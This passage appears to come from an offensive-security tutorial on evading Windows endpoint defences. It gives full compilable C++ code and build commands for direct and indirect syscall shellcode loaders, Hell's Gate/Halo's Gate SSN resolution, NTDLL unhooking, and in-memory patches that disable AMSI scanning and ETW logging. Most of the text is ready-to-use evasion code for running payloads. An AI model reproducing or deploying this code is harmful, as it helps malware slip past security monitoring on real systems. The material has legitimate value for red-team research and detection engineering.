| **User-mode hooks** (EDR) | EDR agents patch `ntdll.dll` functions (e.g., `NtAllocateVirtualMemory`) to intercept and inspect calls | EDR-specific |
| **Kernel callbacks** | `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, `ObRegisterCallbacks` — kernel-level monitoring | NT 5.1+ |
| **Smart App Control** | AI/ML-based reputation system; blocks unknown/untrusted executables entirely | Windows 11 22H2+ |
| **VBS** (Virtualization-Based Security) | Hypervisor-enforced code integrity (HVCI); kernel memory protections enforced by Hyper-V | Windows 11 |

> Understanding each layer is critical. There is no single "silver bullet" bypass — you need to address multiple layers simultaneously. The techniques below target the most common and impactful protections.
{: .prompt-info }

---

### Technique 12: Direct Syscalls (SysWhispers2/3)

**Background: What Are Syscalls?**

Every Windows API call eventually ends up in the kernel. The path is:

```
Your code → kernel32.dll → ntdll.dll → syscall instruction → Kernel (ntoskrnl.exe)
```

For example:
- `VirtualAlloc` (kernel32.dll) calls `NtAllocateVirtualMemory` (ntdll.dll)
- `NtAllocateVirtualMemory` loads the **System Service Number (SSN)** into `EAX` and executes the `syscall` instruction
- The CPU transitions from user mode (Ring 3) to kernel mode (Ring 0)

**The EDR Problem:**

EDRs hook functions in `ntdll.dll` by replacing the first bytes of functions like `NtAllocateVirtualMemory` with a `JMP` instruction that redirects execution to the EDR's inspection code. This lets the EDR see every parameter of every Nt* call.

```
Normal: NtAllocateVirtualMemory → mov eax, SSN → syscall → kernel
Hooked: NtAllocateVirtualMemory → JMP edr_hook → inspect → original code → syscall → kernel
```

**The Bypass: Direct Syscalls**

Instead of calling `ntdll.dll` functions (which may be hooked), we execute the `syscall` instruction directly from our own code. We load the SSN into `EAX` ourselves and call `syscall` — completely bypassing `ntdll.dll` and any hooks.

**System Service Numbers (SSNs)**

SSNs are not stable across Windows versions. For example:

| Function | Windows 10 1809 | Windows 10 21H2 | Windows 11 22H2 | Windows 11 24H2 |
|---|---|---|---|---|
| NtAllocateVirtualMemory | 0x0018 | 0x0018 | 0x0018 | 0x0018 |
| NtProtectVirtualMemory | 0x0050 | 0x0050 | 0x0050 | 0x0050 |
| NtWriteVirtualMemory | 0x003A | 0x003A | 0x003A | 0x003A |
| NtCreateThreadEx | 0x00C2 | 0x00C7 | 0x00C7 | 0x00C7 |

> SSN values may vary. The numbers above are approximate — always verify against the specific Windows build you're targeting. Tools like SysWhispers resolve these automatically.
{: .prompt-warning }

**SysWhispers2** generates header files and assembly stubs that implement direct syscalls for you.

```bash
# Install SysWhispers2
git clone https://github.com/jthuraisamy/SysWhispers2.git
cd SysWhispers2
python3 syswhispers.py --preset common -o syscalls
```

This generates:
- `syscalls.h` — Function prototypes for Nt* functions
- `syscalls.c` — SSN resolution logic
- `syscalls-asm.x64.asm` — Assembly stubs with `syscall` instruction

**Full Code — `technique12_direct_syscalls.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// ===== Inline Assembly Syscall Stubs (MSVC x64 doesn't support inline asm,
// so we use a separate .asm file or compiler intrinsics) =====

// For MinGW, we can use inline assembly in a separate function:
// For MSVC, use a .asm file compiled with ml64.exe

// Syscall stub structure:
// mov r10, rcx       ; Windows x64 syscall ABI: r10 = first param
// mov eax, <SSN>     ; System Service Number
// syscall            ; Transition to kernel
// ret

// We'll define the Nt function types
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// ===== Dynamic SSN Resolution =====
// Read SSN from ntdll.dll's function stubs at runtime

DWORD GetSSN(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    if (!pFunc) return 0;

    // The typical ntdll stub looks like:
    // 4C 8B D1         mov r10, rcx
    // B8 XX XX 00 00   mov eax, <SSN>
    // The SSN is at offset +4 (little-endian DWORD)
    BYTE* pBytes = (BYTE*)pFunc;

    // Verify it's an unhooked stub (starts with mov r10, rcx = 4C 8B D1)
    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1) {
        // SSN is in the mov eax instruction at offset +4
        return *(DWORD*)(pBytes + 4);
    }

    // If hooked, the first bytes will be a JMP — this won't work
    printf("[-] %s appears to be hooked!\n", functionName);
    return 0;
}

// ===== Syscall Executor (using raw bytes) =====
// This creates executable memory containing a syscall stub

typedef NTSTATUS (*SyscallFunc)(...);

SyscallFunc CreateSyscallStub(DWORD ssn) {
    // Syscall stub bytes:
    // mov r10, rcx       = 4C 8B D1
    // mov eax, <SSN>     = B8 XX XX XX XX
    // syscall             = 0F 05
    // ret                 = C3
    unsigned char stub[] = {
        0x4C, 0x8B, 0xD1,                          // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,              // mov eax, SSN
        0x0F, 0x05,                                  // syscall
        0xC3                                         // ret
    };

    // Patch in the SSN
    *(DWORD*)(stub + 4) = ssn;

    // Allocate executable memory for the stub
    LPVOID execStub = VirtualAlloc(NULL, sizeof(stub),
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!execStub) return NULL;

    memcpy(execStub, stub, sizeof(stub));

    return (SyscallFunc)execStub;
}

// Encrypted shellcode (XOR-encrypted)
unsigned char encrypted_shellcode[] = {
    // ... your encrypted shellcode ...
    0x00
};
unsigned char xor_key[] = { 0x41 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    // Step 1: Resolve SSNs dynamically
    DWORD ssnAlloc   = GetSSN("NtAllocateVirtualMemory");
    DWORD ssnWrite   = GetSSN("NtWriteVirtualMemory");
    DWORD ssnProtect = GetSSN("NtProtectVirtualMemory");
    DWORD ssnThread  = GetSSN("NtCreateThreadEx");
    DWORD ssnWait    = GetSSN("NtWaitForSingleObject");

    printf("[*] SSNs: Alloc=0x%X, Write=0x%X, Protect=0x%X, Thread=0x%X\n",
           ssnAlloc, ssnWrite, ssnProtect, ssnThread);

    if (!ssnAlloc || !ssnProtect || !ssnThread) {
        printf("[-] SSN resolution failed (functions may be hooked)\n");
        return 1;
    }

    // Step 2: Create syscall stubs
    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)
        CreateSyscallStub(ssnAlloc);
    auto NtProtectVirtualMemory = (NtProtectVirtualMemory_t)
        CreateSyscallStub(ssnProtect);
    auto NtCreateThreadEx = (NtCreateThreadEx_t)
        CreateSyscallStub(ssnThread);
    auto NtWaitForSingleObject = (NtWaitForSingleObject_t)
        CreateSyscallStub(ssnWait);

    // Step 3: Allocate memory via direct syscall
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcode_size;

    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),    // ProcessHandle (-1 = current process)
        &baseAddress,           // BaseAddress (NULL = let system choose)
        0,                      // ZeroBits
        &regionSize,            // RegionSize
        MEM_COMMIT | MEM_RESERVE,  // AllocationType
        PAGE_READWRITE          // Protect (RW, not RWX!)
    );

    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Memory allocated at: 0x%p\n", baseAddress);

    // Step 4: Copy and decrypt shellcode
    memcpy(baseAddress, encrypted_shellcode, shellcode_size);
    xor_decrypt((unsigned char*)baseAddress, shellcode_size,
                xor_key, sizeof(xor_key));

    // Step 5: Change protection via direct syscall
    PVOID protectBase = baseAddress;
    SIZE_T protectSize = shellcode_size;
    ULONG oldProtect = 0;

    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &protectBase,
        &protectSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%lX\n", status);
        return 1;
    }

    // Step 6: Create thread via direct syscall
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        baseAddress,            // Start address = shellcode
        NULL,                   // No argument
        0,                      // No flags (run immediately)
        0, 0, 0,
        NULL
    );

    if (status != 0) {
        printf("[-] NtCreateThreadEx failed: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Thread created via direct syscall\n");

    // Step 7: Wait
    NtWaitForSingleObject(hThread, FALSE, NULL);

    return 0;
}
```

**Compilation (with separate ASM file if using SysWhispers2):**

```bash
# Using MinGW with inline stubs (as shown above):
x86_64-w64-mingw32-g++ -o technique12_syscalls.exe technique12_direct_syscalls.cpp -lws2_32 -static

# Using MSVC with SysWhispers2 ASM stubs:
# ml64 /c syscalls-asm.x64.asm
# cl.exe /O2 technique12_direct_syscalls.cpp syscalls.c syscalls-asm.x64.obj
```

---

### Technique 13: Indirect Syscalls

**Why Direct Syscalls Are Now Detected (2024+)**

EDR vendors adapted to direct syscalls by analyzing the **call stack**. When the `syscall` instruction executes, the return address on the stack should point into `ntdll.dll` (since legitimate code calls `ntdll.dll` functions). If the return address points to an unknown memory region (your loader's allocated memory), it's flagged as suspicious.

```
Direct syscall call stack (SUSPICIOUS):
  ntoskrnl.exe!NtAllocateVirtualMemory
  ← 0x00007FF6XXXXX (your code!) ← should be ntdll.dll!
```

**The Fix: Indirect Syscalls**

Instead of executing `syscall` from our own code, we find the `syscall; ret` instruction sequence inside `ntdll.dll` and jump to it. This way, the return address on the call stack points into `ntdll.dll` — exactly where the EDR expects it.

```
Indirect syscall flow:
  Your code → sets up SSN in EAX → JMP to ntdll!NtXxx+0x12 (syscall instruction)
  Call stack shows: ntdll.dll → kernel — perfectly legitimate!
```

**Full Code — `technique13_indirect_syscalls.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// Find the address of the 'syscall; ret' instruction in an ntdll function
PVOID GetSyscallAddress(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;

    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    if (!pFunc) return NULL;

    BYTE* pBytes = (BYTE*)pFunc;

    // Search for the syscall (0F 05) + ret (C3) sequence
    // It's typically at offset +18 in the Nt* stub, but we search to be safe
    for (int i = 0; i < 64; i++) {
        if (pBytes[i] == 0x0F && pBytes[i+1] == 0x05 && pBytes[i+2] == 0xC3) {
            return (PVOID)(pBytes + i);
        }
    }

    printf("[-] Could not find syscall instruction in %s\n", functionName);
    return NULL;
}

// Get SSN from ntdll function
DWORD GetSSN(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    if (!pFunc) return 0;

    BYTE* p = (BYTE*)pFunc;
    // Check for unhooked: 4C 8B D1 B8 XX XX 00 00
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(DWORD*)(p + 4);
    }
    return 0;
}

// Create an indirect syscall stub
// The stub sets up the SSN then JMPs to the real syscall instruction in ntdll
typedef NTSTATUS (*SyscallFunc)(...);

SyscallFunc CreateIndirectSyscallStub(DWORD ssn, PVOID syscallAddr) {
    unsigned char stub[] = {
        0x4C, 0x8B, 0xD1,                          // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,              // mov eax, SSN
        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00,        // mov r11, syscall_addr (8 bytes)
                    0x00, 0x00, 0x00, 0x00,
        0x41, 0xFF, 0xE3                            // jmp r11
    };

    // Patch SSN
    *(DWORD*)(stub + 4) = ssn;

    // Patch syscall address (8 bytes for x64 pointer)
    *(UINT64*)(stub + 10) = (UINT64)syscallAddr;

    LPVOID execStub = VirtualAlloc(NULL, sizeof(stub),
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!execStub) return NULL;

    memcpy(execStub, stub, sizeof(stub));
    return (SyscallFunc)execStub;
}

int main() {
    // Get SSN and syscall address for NtAllocateVirtualMemory
    DWORD ssn = GetSSN("NtAllocateVirtualMemory");
    PVOID syscallAddr = GetSyscallAddress("NtAllocateVirtualMemory");

    printf("[*] NtAllocateVirtualMemory SSN: 0x%X\n", ssn);
    printf("[*] Syscall instruction at: 0x%p\n", syscallAddr);

    if (!ssn || !syscallAddr) {
        printf("[-] Resolution failed\n");
        return 1;
    }

    // Create indirect syscall stub
    auto NtAllocateVirtualMemory =
        (NTSTATUS (*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))
        CreateIndirectSyscallStub(ssn, syscallAddr);

    // Use it — call stack will show ntdll.dll as the syscall origin
    PVOID baseAddress = NULL;
    SIZE_T regionSize = 4096;

    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(), &baseAddress, 0,
        &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("[+] NtAllocateVirtualMemory via indirect syscall: 0x%lX\n", status);
    printf("[+] Allocated at: 0x%p\n", baseAddress);

    // ... continue with shellcode loading and execution ...

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique13_indirect.exe technique13_indirect_syscalls.cpp -lws2_32 -static
```

> Indirect syscalls are the current gold standard (2025-2026) for bypassing EDR userland hooks. The key insight is that the `syscall` instruction must execute from within `ntdll.dll`'s address space for the call stack to appear legitimate.
{: .prompt-tip }

---

### Technique 14: Hell's Gate / Halo's Gate

**Hell's Gate** is a technique for dynamically resolving System Service Numbers (SSNs) at runtime by parsing `ntdll.dll`'s export table and reading the syscall stubs directly — no hardcoded SSNs needed.

**The Problem It Solves:**

- `GetProcAddress` might be hooked
- Hardcoding SSNs means your loader only works on specific Windows versions
- You need SSNs without calling any potentially monitored APIs

**How Hell's Gate Works:**

1. Walk the **PEB** (Process Environment Block) to find `ntdll.dll`'s base address
2. Parse `ntdll.dll`'s PE headers to find the Export Address Table
3. For each exported `Nt*` function, read the first bytes of the stub
4. Extract the SSN from the `mov eax, <SSN>` instruction

**Halo's Gate Extension:**

What if an EDR has hooked the target function? The first bytes won't be `mov r10, rcx; mov eax, SSN` — they'll be a `JMP` to the EDR's hook. Halo's Gate handles this by:

1. If the target function is hooked, check **neighboring functions** (the function above or below in the export table)
2. Neighboring functions likely have consecutive SSNs
3. If `NtFunction+1` has SSN = X, then `NtFunction` has SSN = X-1

**Conceptual Code — `technique14_hells_gate.cpp`:**

```cpp
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Structure to hold resolved syscall information
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;       // Function address in ntdll
    DWORD64 dwHash;         // Function name hash
    WORD    wSystemCall;    // System Service Number
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

// djb2 hash
DWORD64 djb2_hash(const char* str) {
    DWORD64 hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// Find ntdll base via PEB
HMODULE GetNtdllBase() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY head = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    // ntdll.dll is typically the second entry
    // (first is the exe itself, second is ntdll)
    curr = curr->Flink;  // Skip exe
    PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
        curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    return (HMODULE)pEntry->DllBase;
}

// Hell's Gate: Check if a function is hooked and extract SSN
BOOL HellsGateExtractSSN(PVOID funcAddr, WORD* ssn) {
    BYTE* p = (BYTE*)funcAddr;

    // Unhooked Nt* stub pattern (Windows x64):
    // 4C 8B D1        mov r10, rcx
    // B8 XX XX 00 00  mov eax, SSN
    // 0F 05           syscall
    // C3              ret

    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 &&  // mov r10, rcx
        p[3] == 0xB8 &&                                     // mov eax, ...
        p[6] == 0x00 && p[7] == 0x00) {                     // SSN high bytes
        *ssn = *(WORD*)(p + 4);
        return TRUE;  // Not hooked — SSN extracted directly
    }

    return FALSE;  // Hooked — can't extract directly
}

// Halo's Gate: If target is hooked, check neighbors
BOOL HalosGateExtractSSN(HMODULE hNtdll, PVOID funcAddr, WORD* ssn) {
    // First try Hell's Gate (direct extraction)
    if (HellsGateExtractSSN(funcAddr, ssn)) {
        return TRUE;
    }

    // Function is hooked — search neighboring functions
    BYTE* p = (BYTE*)funcAddr;

    // Search downward (higher addresses = higher SSNs)
    for (int i = 1; i < 500; i++) {
        // Each Nt stub is typically 32 bytes apart
        BYTE* neighbor = p + (i * 32);

        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B &&
            neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
            WORD neighborSSN = *(WORD*)(neighbor + 4);
            *ssn = neighborSSN - (WORD)i;  // Our SSN = neighbor's SSN - offset
            return TRUE;
        }
    }

    // Search upward (lower addresses = lower SSNs)
    for (int i = 1; i < 500; i++) {
        BYTE* neighbor = p - (i * 32);

        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B &&
            neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
            WORD neighborSSN = *(WORD*)(neighbor + 4);
            *ssn = neighborSSN + (WORD)i;
            return TRUE;
        }
    }

    return FALSE;  // All neighbors hooked — very unlikely
}

int main() {
    // Get ntdll base without any API call
    HMODULE hNtdll = GetNtdllBase();
    printf("[+] ntdll.dll base: 0x%p\n", hNtdll);

    // Parse exports to find NtAllocateVirtualMemory
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hNtdll + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hNtdll + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hNtdll + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hNtdll + exports->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hNtdll + exports->AddressOfFunctions);

    DWORD64 targetHash = djb2_hash("NtAllocateVirtualMemory");
    PVOID targetAddr = NULL;

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hNtdll + nameRVAs[i]);
        if (djb2_hash(name) == targetHash) {
            targetAddr = (PVOID)((BYTE*)hNtdll + funcRVAs[ordinals[i]]);
            printf("[+] Found NtAllocateVirtualMemory at: 0x%p\n", targetAddr);
            break;
        }
    }

    if (!targetAddr) {
        printf("[-] Function not found\n");
        return 1;
    }

    // Extract SSN using Hell's Gate / Halo's Gate
    WORD ssn = 0;
    if (HalosGateExtractSSN(hNtdll, targetAddr, &ssn)) {
        printf("[+] SSN resolved: 0x%04X\n", ssn);
    } else {
        printf("[-] Could not resolve SSN\n");
        return 1;
    }

    // Now use ssn with direct/indirect syscall stubs...
    printf("[+] Ready to execute syscall with SSN 0x%04X\n", ssn);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique14_hellsgate.exe technique14_hells_gate.cpp -lws2_32 -static
```

---

### Technique 15: NTDLL Unhooking

Rather than avoiding hooked functions (like syscalls do), this technique **removes the hooks entirely** by restoring `ntdll.dll` to its original, unhooked state.

**How EDR Hooks Work:**

When an EDR loads into your process, it modifies the first bytes of critical `ntdll.dll` functions:

```
Original NtAllocateVirtualMemory:
  4C 8B D1        mov r10, rcx
  B8 18 00 00 00  mov eax, 0x18
  ...

Hooked NtAllocateVirtualMemory:
  E9 XX XX XX XX  jmp edr_detour_function
  00 00 00        (padding)
  ...
```

**Unhooking Strategy: Read Clean Copy from Disk**

The `ntdll.dll` file on disk is unhooked — EDRs only hook the in-memory copy. We can:

1. Open `ntdll.dll` from `C:\Windows\System32\ntdll.dll`
2. Read its `.text` section
3. Overwrite the in-memory `.text` section with the clean copy
4. All hooks are removed

**Full Code — `technique15_unhooking.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

BOOL UnhookNtdll() {
    // Step 1: Get the handle to the in-memory ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Could not find ntdll.dll in memory\n");
        return FALSE;
    }

    // Step 2: Build the path to ntdll.dll on disk
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat(ntdllPath, "\\ntdll.dll");

    // Step 3: Open the clean copy from disk
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ,
                                FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open ntdll.dll from disk: %d\n",
               GetLastError());
        return FALSE;
    }

    // Step 4: Get file size and read entire file
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)VirtualAlloc(NULL, fileSize,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fileBuffer) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Step 5: Parse the PE headers of the clean copy
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        fileBuffer + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);

    // Step 6: Find the .text section
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            // Source: .text section in the clean file
            BYTE* cleanText = fileBuffer + sections[i].PointerToRawData;
            SIZE_T textSize = sections[i].Misc.VirtualSize;

            // Destination: .text section in the in-memory ntdll
            BYTE* memText = (BYTE*)hNtdll + sections[i].VirtualAddress;

            printf("[*] .text section: mem=0x%p, size=%zu\n",
                   memText, textSize);

            // Step 7: Make the in-memory .text section writable
            DWORD oldProtect;
            if (!VirtualProtect(memText, textSize,
                                PAGE_EXECUTE_READWRITE, &oldProtect)) {
                printf("[-] VirtualProtect failed: %d\n", GetLastError());
                VirtualFree(fileBuffer, 0, MEM_RELEASE);
                return FALSE;
            }

            // Step 8: Overwrite hooked .text with clean copy
            memcpy(memText, cleanText, textSize);

            // Step 9: Restore original protection
            VirtualProtect(memText, textSize, oldProtect, &oldProtect);

            printf("[+] ntdll.dll .text section restored (%zu bytes)\n",
                   textSize);
            VirtualFree(fileBuffer, 0, MEM_RELEASE);
            return TRUE;
        }
    }

    printf("[-] .text section not found\n");
    VirtualFree(fileBuffer, 0, MEM_RELEASE);
    return FALSE;
}

int main() {
    printf("[*] Unhooking ntdll.dll...\n");

    if (UnhookNtdll()) {
        printf("[+] ntdll.dll successfully unhooked!\n");
        printf("[+] All EDR hooks have been removed.\n");

        // Now you can call any Nt* function normally — no hooks!
        // Proceed with shellcode loading...
    } else {
        printf("[-] Unhooking failed\n");
    }

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique15_unhook.exe technique15_unhooking.cpp -lws2_32 -static
```

> Some EDRs monitor for `ReadFile` on `ntdll.dll` or detect `.text` section overwrites. Alternative approaches include: (1) creating a suspended process and reading its clean `ntdll`, (2) mapping `ntdll` from `\KnownDlls\ntdll.dll`, or (3) loading a second copy of `ntdll.dll` from a renamed file.
{: .prompt-warning }

---

### Technique 16: AMSI Bypass

**What is AMSI?**

The Anti-Malware Scan Interface (AMSI) is a Windows component that allows antivirus products to scan content at runtime. It primarily targets:
- PowerShell scripts
- .NET assemblies (loaded via `Assembly.Load`)
- VBScript and JScript
- Windows Script Host

**When Do You Need an AMSI Bypass?**

> **Important:** If your loader is a compiled C/C++ executable that loads raw shellcode into memory, AMSI is **NOT involved**. AMSI scans scripted/managed content, not raw memory allocations. You only need an AMSI bypass if you're loading .NET assemblies (e.g., running Rubeus, Seatbelt) or executing PowerShell commands from your loader.
{: .prompt-info }

**The Classic Patch: AmsiScanBuffer**

The key function is `AmsiScanBuffer` in `amsi.dll`. By patching its first bytes to return immediately with a "clean" result, all AMSI scans will report content as benign.

**Full Code — `technique16_amsi_bypass.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

BOOL PatchAMSI() {
    // Step 1: Load amsi.dll (it may not be loaded yet)
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] Could not load amsi.dll: %d\n", GetLastError());
        return FALSE;
    }

    // Step 2: Find AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] Could not find AmsiScanBuffer\n");
        return FALSE;
    }
    printf("[+] AmsiScanBuffer at: 0x%p\n", pAmsiScanBuffer);

    // Step 3: Patch bytes
    // We want AmsiScanBuffer to immediately return S_OK (0x00000000)
    // with AMSI_RESULT_CLEAN
    //
    // Patch: mov eax, 0x80070057 (E_INVALIDARG) then ret
    // This makes AMSI think the scan parameters are invalid, returning clean
    //
    // Alternatively: xor eax, eax; ret (return S_OK = 0)
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (E_INVALIDARG)
        0xC3                             // ret
    };

    // Step 4: Make the memory writable
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    // Step 5: Write the patch
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));

    // Step 6: Restore protection
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AMSI patched successfully\n");
    return TRUE;
}

int main() {
    PatchAMSI();

    // Now you can load .NET assemblies or run PowerShell
    // without AMSI scanning them

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique16_amsi.exe technique16_amsi_bypass.cpp -lws2_32 -static
```

---

### Technique 17: ETW Patching

**What is ETW?**

Event Tracing for Windows (ETW) is a high-performance logging mechanism built into the Windows kernel. It logs events from both user-mode and kernel-mode components. EDRs and Windows Defender consume ETW events to detect suspicious behavior, such as:
- Process creation
- Thread creation
- Image loading (DLL loads)
- Memory allocation patterns
- Network connections

The key function is `EtwEventWrite` in `ntdll.dll`. By patching it to return immediately, we prevent ETW events from being generated by our process.

**Full Code — `technique17_etw_patch.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

BOOL PatchETW() {
    // Step 1: Get ntdll.dll handle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Could not find ntdll.dll\n");
        return FALSE;
    }

    // Step 2: Find EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] Could not find EtwEventWrite\n");
        return FALSE;
    }
    printf("[+] EtwEventWrite at: 0x%p\n", pEtwEventWrite);

    // Step 3: Patch with a single RET instruction
    // This makes EtwEventWrite return immediately without logging anything
    // Return value: STATUS_SUCCESS (0) — xor eax, eax; ret
    unsigned char patch[] = {
        0x48, 0x33, 0xC0,  // xor rax, rax  (return 0 = STATUS_SUCCESS)
        0xC3                // ret
    };

    // Step 4: Make writable
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    // Step 5: Apply patch
    memcpy(pEtwEventWrite, patch, sizeof(patch));

    // Step 6: Restore protection
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] ETW patched — no more event logging from this process\n");
    return TRUE;
}

int main() {
    // Patch ETW first, before doing anything suspicious
    PatchETW();

    // Now proceed with shellcode operations — no ETW events generated
    printf("[+] ETW disabled. Proceeding with payload execution...\n");

    // ... shellcode loading code here ...

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique17_etw.exe technique17_etw_patch.cpp -lws2_32 -static
```

